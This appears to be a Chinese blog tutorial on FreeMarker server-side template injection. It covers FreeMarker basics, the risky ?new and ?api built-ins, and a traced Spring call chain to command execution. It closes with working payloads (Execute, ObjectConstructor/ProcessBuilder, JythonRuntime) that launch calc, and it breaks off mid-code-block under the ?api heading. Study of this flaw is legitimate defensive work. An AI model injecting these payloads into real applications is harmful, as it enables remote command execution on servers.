    <content type="html"><![CDATA[<h1 id="SSTI-Freemarker模板注入漏洞"><a href="#SSTI-Freemarker模板注入漏洞" class="headerlink" title="SSTI-Freemarker模板注入漏洞"></a>SSTI-Freemarker模板注入漏洞</h1><h2 id="一、Freemarker-简介"><a href="#一、Freemarker-简介" class="headerlink" title="一、Freemarker 简介"></a>一、Freemarker 简介</h2><p>FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个 Java类库，是一款程序员可以嵌入他们所开发产品的组件。<br>模板编写为 FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是像 PHP 那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。<br><img src="/image/1692253648346-5980e250-383b-4d88-9738-2c1ee45a8d27.png"><br>这种方式通常被称为 MVC (模型 视图 控制器) 模式s，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。<br>而 FreeMarker 最初的设计，是被用来在 MVC 模式的 Web 开发框架中生成 HTML 页面的，它没有被绑定到 Servlet 或 HTML 或任意 Web 相关的东西上。它也可以用于非 Web 应用环境中。</p><h2 id="二、Freemarker-使用"><a href="#二、Freemarker-使用" class="headerlink" title="二、Freemarker 使用"></a>二、Freemarker 使用</h2><h3 id="1、Spring-boot-Freemarker示例"><a href="#1、Spring-boot-Freemarker示例" class="headerlink" title="1、Spring boot + Freemarker示例"></a>1、Spring boot + Freemarker示例</h3><p>pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>spring-boot-starter-freemarker-2.7.13.pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.32<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-support<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>application.yml 添加配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">freemarker:</span><br>    <span class="hljs-comment"># 模板后缀名</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.ftl</span><br>    <span class="hljs-comment"># 文档类型</span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><br>    <span class="hljs-comment"># 页面编码</span><br>    <span class="hljs-attr">charset:</span> <span class="hljs-string">UTF-8</span><br>    <span class="hljs-comment"># 页面缓存</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-comment"># 模板路径</span><br>    <span class="hljs-attr">template-loader-path:</span> <span class="hljs-string">classpath:/templates/</span><br></code></pre></td></tr></table></figure><p>新建 index.ftl</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FreeMarker<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.age&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新建 UserController </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.example.demo.bean.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/index&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setAge(<span class="hljs-number">5</span>);<br>        user.setName(<span class="hljs-string">&quot;li&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 Spring boot 项目，访问 index 成功显示<br><img src="/image/1692255786949-7af6c0fe-7a87-48ab-8959-9c1b0e564adc.png" alt="image.png"></p><h3 id="2、Freemarker-模板"><a href="#2、Freemarker-模板" class="headerlink" title="2、Freemarker 模板"></a>2、Freemarker 模板</h3><p>见官方文档（<a href="http://freemarker.foofun.cn/dgui_template.html">http://freemarker.foofun.cn/dgui_template.html</a>）</p><h4 id="1-、总体结构"><a href="#1-、总体结构" class="headerlink" title="(1)、总体结构"></a>(1)、总体结构</h4><p>实际上用程序语言编写的程序就是模板。 FTL (代表FreeMarker模板语言)。 这是为编写模板设计的非常简单的编程语言。<br>模板(FTL编程)是由如下部分混合而成的：</p><ul><li>文本：文本会照着原样来输出。</li><li>插值：这部分的输出会被计算的值来替换。插值由 ${ and } 所分隔(或者 #{ and }，这种风格已经不建议再使用了；<a href="http://freemarker.foofun.cn/ref_depr_numerical_interpolation.html">点击查看更多</a>)。</li><li>FTL 标签：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输出内容中。</li><li>注释：注释和HTML的注释也很相似，但它们是由 &lt;#– 和 –&gt;来分隔的。注释会被FreeMarker直接忽略， 更不会在输出内容中显示。</li></ul><p>我们来看一个具体的模板。其中的内容已经用颜色来标记了： 文本， 插值， FTL 标签， 注释。为了看到可见的 换行符， 这里使用了 [BR]。<br><img src="/image/1692256878378-75f36ccf-7214-42d2-980c-e573fc17bde2.png" alt="image.png">s<br>注：</p><ul><li>FTL是区分大小写的。 list 是指令的名称而 List 就不是。类似地 ${name} 和 ${Name} 或 ${NAME} 也是不同的。</li><li>插值 仅仅可以在 文本 中使用。 (也可以是字符串表达式；请参考 <a href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">后续内容</a>)</li><li>FTL 标签 不可以在其他 FTL 标签 和 插值中使用。比如， 这样做是 <em>错误</em> 的： &lt;#if &lt;#include ‘foo’&gt;&#x3D;’bar’&gt;…&lt;&#x2F;#if&gt;</li><li>注释 可以放在 FTL 标签 和 插值中</li></ul><h4 id="2-、指令"><a href="#2-、指令" class="headerlink" title="(2)、指令"></a>(2)、指令</h4><p>使用 FTL标签来调用 <strong>指令</strong>。 在示例中已经调用了 list 指令。在语法上我们使用了两个标签： &lt;#list animals as animal&gt; 和 &lt;&#x2F;#list&gt;。<br>FTL 标签分为两种：</p><ul><li>开始标签： &lt;#_directivename_ _parameters_&gt;</li><li>结束标签： &lt;&#x2F;#_directivename_&gt;</li></ul><p>除了标签以 # 开头外，其他都和HTML，XML的语法很相似。 如果标签没有嵌套内容(在开始标签和结束标签之间的内容)，那么可以只使用开始标签。 例如 &lt;#if <em>something_&gt;</em>…<em>&lt;&#x2F;#if&gt;， 而FreeMarker知道 &lt;#include _something_&gt; 中的 include 指令没有可嵌套的内容。<br><em>parameters</em> 的格式由 <em>directivename_来决定。<br>事实上，指令有两种类型： <a href="http://freemarker.foofun.cn/gloss.html#gloss.predefinedDirective">预定义指令</a> 和 <a href="http://freemarker.foofun.cn/gloss.html#gloss.userDefinedDirective">用户自定义指令</a>。 对于用户自定义的指令使用 @ 来代替 #，比如，&lt;@mydirective _parameters_&gt;</em>…</em>&lt;&#x2F;@mydirective&gt;。 更深的区别在于如果指令没有嵌套内容，那么必须这么使用 &lt;@mydirective _parameters_ &#x2F;&gt;，这和XML语法很相似 (例如 <img _..._ />)。<br>assign 指令:主要是用于为该模板页面创建或替换一个顶层变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign name1=value1 name2=value2 ... nameN=valueN&gt;<br>or<br>&lt;#assign same as above... in namespacehash&gt;<br>or<br>&lt;#assign name&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br>or<br>&lt;#assign name in namespacehash&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br><br>Tips:name为变量名，value为表达式，namespacehash是命名空间创建的哈希表，是表达式。<br><br><span class="hljs-keyword">for</span> example:<br>&lt;#<span class="hljs-type">assign</span> <span class="hljs-variable">seq</span> <span class="hljs-operator">=</span> [<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>]&gt;<span class="hljs-comment">//创建了一个变量名为seq的序列</span><br></code></pre></td></tr></table></figure><h4 id="3-、表达式"><a href="#3-、表达式" class="headerlink" title="(3)、表达式"></a>(3)、表达式</h4><p>当需要给插值或者指令参数提供值时，可以使用变量或其他复杂的表达式。 例如，我们设x为8，y为5，那么 (x + y)&#x2F;2 的值就会被处理成数字类型的值6.5。<br>在我们展开细节之前，先来看一些具体的例子：</p><ul><li>当给插值提供值时：插值的使用方式为 ${<em>expression</em>}， 把它放到你想输出文本的位置上，然后给值就可以打印出来了。 即 ${(5 + 8)&#x2F;2} 会打印出 ‘’6.5’’ 来 (如果输出的语言不是美国英语，也可能打印出’’6,5’’来)。</li><li>当给指令参数提供值时：在入门章节我们已经看到 if 指令的使用了。这个指令的语法是：&lt;#if <em>expression_&gt;</em>…_&lt;&#x2F;#if&gt;。 这里的表达式计算结果必须是布尔类型的。比如 &lt;#if 2 &lt; 3&gt; 中的 2 &lt;3 (2小于3)是结果为 true 的布尔表达式。</li></ul><h4 id="4-、插值"><a href="#4-、插值" class="headerlink" title="(4)、插值"></a>(4)、插值</h4><p>插值的使用格式是： ${<em>expression</em>}，这里的 <em>expression</em> 可以是所有种类的表达式(比如 ${100 + x})。<br>插值是用来给 <em>表达式</em> 插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在 <a href="http://freemarker.foofun.cn/dgui_template_overallstructure.html">文本区</a> (比如 Hello ${name}!) 和 <a href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">字符串表达式</a> (比如 &lt;#include “&#x2F;footer&#x2F;${company}.html”&gt;)中。<br>表达式的结果必须是字符串，数字或者日期&#x2F;时间&#x2F;日期-时间值， 因为(默认是这样)仅仅这些值可以被插值自动转换为字符串。其它类型的值 (比如布尔值，序列)必须 “手动地” 转换成字符串(后续会有一些建议)， 否则就会发生错误，中止模板执行。</p><h3 id="3、Freemarker-内建函数"><a href="#3、Freemarker-内建函数" class="headerlink" title="3、Freemarker 内建函数"></a>3、Freemarker 内建函数</h3><p>Freemarker 提供了很多内置函数供开发者使用，具体见<a href="http://freemarker.foofun.cn/ref_builtins.html">官方文档</a>，存在风险的函数为 new 和 api,详情如下：</p><h4 id="1-、new"><a href="#1-、new" class="headerlink" title="(1)、new"></a>(1)、new</h4><p>用来创建一个确定的 TemplateModel 实现变量的内建函数。<br>在 ? 的左边你可以指定一个字符串， 值为 TemplateModel 实现类的完全限定名。 结果是调用构造方法生成一个方法变量，然后将新变量返回。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#-- Creates an user-defined directive be calling the parameterless constructor of the class --&gt;<br>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;<br>&lt;#-- Creates an user-defined directive be calling the constructor with one numerical argument --&gt;<br>&lt;#assign word_wrapp_narrow = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new(40)&gt;<br></code></pre></td></tr></table></figure><p>该内建函数可以创建任意的 Java 对象，只要类实现了 TemplateModel 接口即可创建进而使用这些对象， 并且可以触发没有实现 TemplateModel 接口的类的静态初始化块。<br> 2.3.17后可使用 Configuration.setNewBuiltinClassResolver(TemplateClassResolver) 、new_builtin_class_resolver 限制 new 内建函数对类的访问。 </p><h4 id="2-、api"><a href="#2-、api" class="headerlink" title="(2)、api"></a>(2)、api</h4><p>api 内建函数于 FreeMarker 2.3.22 版本出现，之前版本不存在。<br>如果value本身支持这个额外的特性， value?api 提供访问 value 的API (通常是 Java API)，比如 <code>value?api.someJavaMethod()</code>， 当需要调用对象的Java方法时，这种方式很少使用， 但是 FreeMarker 揭示的value的简化视图的模板隐藏了它，也没有相等的内建函数。 例如，当有一个 Map，并放入数据模型 (使用默认的对象包装器)，模板中的 myMap.myMethod() 基本上翻译成Java的 (<code>(Method) myMap.get(&quot;myMethod&quot;)).invoke(...)，</code>因此不能调用 myMethod。如果编写了 <code>myMap?api.myMethod()</code> 来代替，那么就是Java中的 myMap.myMethod()。<br>api 内建函数使用存在以下限制：</p><ul><li>api_builtin_enabled 配置设置项必须设置为 true。 2.3.22 版本及之后默认为 false</li><li>值本身要支持它。我们在讨论当模板看到的值，它是通过对象包装从原始对象值(来自于数据模型或者Java方法的返回值)中创建的。 因此，这就依赖 FreeMarker 的配置设置项 object_wrapper， 还有被包装的(原始)对象：<ul><li>当对象包装器是 DefaultObjectWrapper ，并且它的 incompatibleImprovements 设置为 2.3.22 或更高 (在这里看如何设置它) (事实上，要做的是将它的 useAdaptersForContainer 属性设置为 true，但那是提到的 incompatibleImprovements 的默认值)时，从 Map 和 List 中得到FTL值支持 ?api。其它的 java.util.Collections 也是这样，如果 DefaultObjectWrapper 的 forceLegacyNonListCollections 属性设置为 false (默认是 true， 这是为了更好的向后兼容拆包)。</li><li>当被纯 BeansWrapper 包装时，所有值都支持 ?api。但是再次重申，如果有其它方法，就避免使用它。</li><li>实现了 freemarker.template.TemplateModelWithAPISupport 接口， 自定义的 TemplateModel 可以支持 ?api。</li></ul></li></ul><p>当在配置中不允许或值本身不支持 ?api 时使用了它， 就会中止模板处理并发生错误。</p><h2 id="三、Freemarker-模板注入漏洞分析"><a href="#三、Freemarker-模板注入漏洞分析" class="headerlink" title="三、Freemarker 模板注入漏洞分析"></a>三、Freemarker 模板注入漏洞分析</h2><h3 id="1、获取模板"><a href="#1、获取模板" class="headerlink" title="1、获取模板"></a>1、获取模板</h3><p>Spring boot 所有http请求均调用org.springframework.web.servlet.FrameworkServlet#service()方法进行处理，调用super.service()进行处理<br><img src="/image/1692601460428-d9d31724-a209-438a-962d-e3433eefae48.png" alt="image.png"><br>调用至javax.servlet.http.HttpServlet#service()<br><img src="/image/1692601561814-a1b02020-2ce9-448b-99f5-3a2780118cde.png" alt="image.png"><br>调用至javax.servlet.http.HttpServlet#doget()<br><img src="/image/1692601590997-6936a0a2-abb7-41fb-99ab-d8ad8257e147.png" alt="image.png"><br>调用至rg.springframework.web.servlet.FrameworkServlet#processRequest()<br><img src="/image/1692601622764-805dc5eb-68d7-4fe8-b188-80f063cf12a6.png" alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#doService()  –&gt;<br>org.springframework.web.servlet.DispatcherServlet #doDispatch()  –&gt;</p><p><img src="/image/image-20230831222714908.png" alt="image-20230831222714908"></p><p>org.springframework.web.servlet.DispatcherServlet #processDispatchResult()  –&gt;<br>调用至org.springframework.web.servlet.DispatcherServlet#render()<br><img src="/image/1692602149932-c030eb2f-68b4-4e5b-a68e-aa9e057e1c89.png" alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#getCandidateViews()  –&gt;<br>org.springframework.web.servlet.view.AbstractCachingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.UrlBasedViewResolver#createView() 创建模板，此方法先判断是否为跳转为跳转也没，此处均不进入 if 最终调用super.createView()<br><img src="/image/1692602913661-b9a4d5b3-416e-4448-8e6c-2b598232ac4c.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#createView()<br><img src="/image/1692603044878-90df8b29-677d-46d8-916b-b7feee16cab6.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractTemplateViewResolver#buildView()<br><img src="/image/1692603128711-c55b32e7-c58f-4993-b78f-c0bf705357ee.png" alt="image.png"><br>org.springframework.web.servlet.view.UrlBasedViewResolver#buildView() 此处通过 <code>this.instantiateView() </code>new 一个 FreeMarkerView 类，然后进行了一些基础赋值，构建 View 基础框架，此处设置 url 并添加 .ftl后缀。<br><img src="/image/1693463452916-d602cad0-ce1e-48f8-a288-d6352649eba2.png" alt="image.png"><br><img src="/image/1692603220587-66f3a53f-d9d8-4b69-bda2-76e5712b7b98.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView() 方法调用buildView() 后，继续调用view.checkResource()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" alt="image.png"><br>org.springframework.web.servlet.view.freemarker.FreeMarkerView#checkResource() 判断 url 是否为空，不为空后调用 getTemplate(url, locale)</p><p><img src="/image/image-20230831213348548.png" alt="image-20230831213348548"></p><p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#getTemplate(url, locale)</p><p><img src="/image/image-20230831213451184.png" alt="image-20230831213451184"></p><p>freemarker.template.Configuration#getTemplate() 调用此类同名方法,跟进this.cache.getTemplate()</p><p><img src="/image/image-20230831213617838.png" alt="image-20230831213617838"></p><p><img src="/image/image-20230831213702913.png" alt="image-20230831213702913"></p><p>freemarker.cache.TemplateCache#getTemplate() ,跟进this.getTemplateInternal()</p><p><img src="/image/image-20230831213852936.png" alt="image-20230831213852936"></p><p>freemarker.cache.TemplateCache#getTemplateInternal(),此处进行判断  –&gt;</p><p><img src="/image/image-20230831214145389.png" alt="image-20230831214145389"></p><p>freemarker.cache.TemplateCache#lookupTemplate()  –&gt;</p><p>freemarker.cache.TemplateLookupStrategy#lookup()  –&gt;</p><p>freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy()</p><p>…</p><p>最终调用<code>this.lookupWithLocalizedThenAcquisitionStrategy()</code>,此处会先拼接 _zh_CN,再寻找未拼接_zh_CN的模板名，调用this.findTemplateSource(path)获取模板实例。</p><p><img src="/image/image-20230831221401069.png" alt="image-20230831221401069"></p><p><img src="/image/image-20230831221447397.png" alt="image-20230831221447397"></p><p>此处获取到模板文件里数据</p><h3 id="2、解析模板"><a href="#2、解析模板" class="headerlink" title="2、解析模板"></a>2、解析模板</h3><p>回到org.springframework.web.servlet.DispatcherServlet#render()  resolveViewName()加载模板文件后使用view.render()对模板进行解析。</p><p><img src="/image/image-20230831224541162.png" alt="image-20230831224541162"></p><p>最终调用至 org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender()</p><p><img src="/image/image-20230901140401840.png" alt="image-20230901140401840"></p><p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#processTemplate()</p><p><img src="/image/image-20230901140448277.png" alt="image-20230901140448277"></p><p>freemarker.template.Template#process()   调用createProcessingEnvironment()#process(),createProcessingEnvironment()返回Environment 类，故即调用 Environment#process()</p><p><img src="/image/image-20230901140537699.png" alt="image-20230901140537699"></p><p>freemarker.core.Environment#process()</p><p><img src="/image/image-20230901151520810.png" alt="image-20230901151520810"></p><p>freemarker.core.Environment#visit() 对 ftl 的文件进行遍历,若读取到一条 freeMarker 表达式，回调 visit() 方法， visit() 方法调用element.accept()</p><p><img src="/image/image-20230901151620894.png" alt="image-20230901151620894"></p><p>freemarker.core.Assignment#accept()  判断 namespaceExp 是否为 null，接着判断 this.operatorType 是否等于 65536，跟进 eval() 方法</p><p><img src="/image/image-20230902091715395.png" alt="image-20230902091715395"></p><p>freemarker.core.Expression#eval() 方法判断 constantValue 是否为 null，此处 constantValue 为 null，调用 this._eval()</p><p><img src="/image/image-20230902091752082.png" alt="image-20230902091752082"></p><p>freemarker.core.MethodCall#_eval()  此处 targetMethod 即在 ftl 语句中声明的类</p><p><img src="/image/image-20230902092640533.png" alt="image-20230902092640533"></p><p>freemarker.core.NewBI#exec() 中调用 newInstance() 初始化声明的类</p><p><img src="/image/image-20230902092809418.png" alt="image-20230902092809418"></p><p>类初始化完成后继续遍历 ftl文件，遍历至<code>value(&quot;Calc&quot;)</code> ，调用至 freemarker.core.DollarVariable#accept()，与之前调用链一致，最终调用至 freemarker.core.MethodCall#_eval() </p><p><img src="/image/image-20230902094928492.png" alt="image-20230902094928492"></p><p>此处即调用至 freemarker.template.utility.Execute#exec() 进行命令执行</p><p><img src="/image/image-20230902095100008.png" alt="image-20230902095100008"></p><h3 id="3、paylod"><a href="#3、paylod" class="headerlink" title="3、paylod"></a>3、paylod</h3><h4 id="1-、new-函数"><a href="#1-、new-函数" class="headerlink" title="(1)、new() 函数"></a>(1)、new() 函数</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;Calc&quot;).start()&#125;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;Calc&quot;) &#125;<br></code></pre></td></tr></table></figure><h4 id="2-、api-函数"><a href="#2-、api-函数" class="headerlink" title="(2)、api() 函数"></a>(2)、api() 函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 